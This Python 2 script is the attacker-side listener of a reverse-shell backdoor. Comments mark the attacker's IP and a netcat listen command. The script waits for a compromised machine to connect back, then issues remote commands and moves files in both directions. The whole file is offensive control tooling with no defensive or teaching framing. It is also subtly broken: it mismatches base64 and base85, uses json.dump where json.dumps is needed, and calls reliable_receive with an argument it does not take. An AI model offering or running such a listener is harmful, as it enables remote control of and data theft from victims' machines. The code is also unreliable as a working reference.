#!/usr/bin/env python
import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port)) # attacker pc ip
        listener.listen(0)
        print("[+] Waiting for incoming connetions")
        self.connection, address = listener.accept()
        print("[+] Get a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dump(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive(1024)

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())
    
    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b85decode(content))
            return "[+] Download successfull."

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            print(result)

# nc -vv -l -p 4444
my_listener = Listener("192.168.1.2", 4444)
my_listener.run()